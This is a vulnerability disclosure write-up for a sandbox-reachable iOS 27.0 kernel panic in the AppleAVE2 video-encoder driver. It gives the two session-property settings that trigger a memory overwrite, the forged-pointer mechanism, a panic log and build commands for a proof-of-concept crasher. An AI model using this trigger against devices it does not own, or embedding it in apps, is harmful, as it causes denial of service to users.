# panicIDK — an app-reachable kernel panic in AppleAVE2 (iOS 27.0)

> **AI-GENERATED SECURITY RESEARCH — authorized research on the owner's own devices, aimed at
> coordinated disclosure to Apple.** This is a **crash oracle** (device-wide denial of service)
> only. Do not run it on devices you do not own.

## The bug (short form)

`AppleAVE2` 913.43 (the hardware video-encoder driver) runs a per-layer reference-count fill
loop in `AVE_PSGen::Init` during kext-side session init. Two ordinary `VTCompressionSession`
properties select the configuration in which that loop executes:

```c
VTSessionSetProperty(session, "EncoderUsage", 1);  // usage mode 1
VTSessionSetProperty(session, "RCMode", 20);       // eRCMode 0x14 = SVE sequential RC
```

With `eRCMode == 0x14` the loop's guard opens — but the loop's length is a bound the kext
**composes itself** (a constant ≈ 12743 slots), not the zero the encoder plugin marshals for
that field. The result is a fixed ~51KB linear fill of a small constant (the reference-count
value, 1) across the tail of the ~84KB per-session kernel allocation, which forges the
session's surface-pool pointer:

```
pcaSurfacePool[0] = 0x0000000100000001   // two adjacent u32 slots, both = 1
```

When the app invalidates the compression session, the driver teardown dereferences the forged
pointer:

```
AVE_Client_Destroy -> AVE_Client_UninitSurfacePool -> SliceRefParams reset
  -> InitList(forged + 0x58) -> kernel data abort -> device panic
```

Everything runs on the app → videocodecd → AppleAVE2 path reachable from the app sandbox;
the fatal dereference happens at a fully attacker-chosen time (session teardown).

## Panic receipt (identical across boots)

```
panic: "Kernel data abort. at pc 0x... (AppleAVE2 + 0xDA78)"
far:   0x0000000100000059
x19:   0x0000000100000001     // the forged pcaSurfacePool[0]
esr:   0x0000000096000046     // EL1 write abort
frames: AVE_Client_Destroy -> AVE_Client_UninitSurfacePool -> list-reset stub
task:  videocodecd (com.apple.coremedia.videocodecd.compressionsession)
```

## Affected versions

| OS | Build | Status |
|---|---|---|
| iOS 27.0 RC | 24A435 (iPhone17,5 verified) | **VULNERABLE — panic reproduced** |
| iOS 27.2 (24B115) | AppleAVE2 913.64.1 | **unverified** — the 27.2 fix train bounds the VPS count family and adds a plugin-side `NumberOfTemporalLayers <= 7` setter bound, but the kext-composed loop bound described here is not in that fix list; testing pending |

Verified on: iPhone 16e (iPhone17,5), AppleAVE2 913.43.1, HEVC hardware encode sessions.

## Build & run

```bash
xcrun -sdk iphoneos clang -arch arm64 -o panicIDK panicIDK.c \
    -framework VideoToolbox -framework CoreMedia -framework CoreVideo \
    -framework CoreFoundation
# codesign with your developer identity and sideload (the file is a plain C main()
# that can also be dropped into any app target and invoked as panicIDK_main())
```

Expected device behavior: the program prints the property/prepare/encode receipts, then
panics the kernel at session teardown (the device reboots and produces the `.ips` above).
If it prints `still alive?`, the kext does not match the vulnerable 913.43 shape.

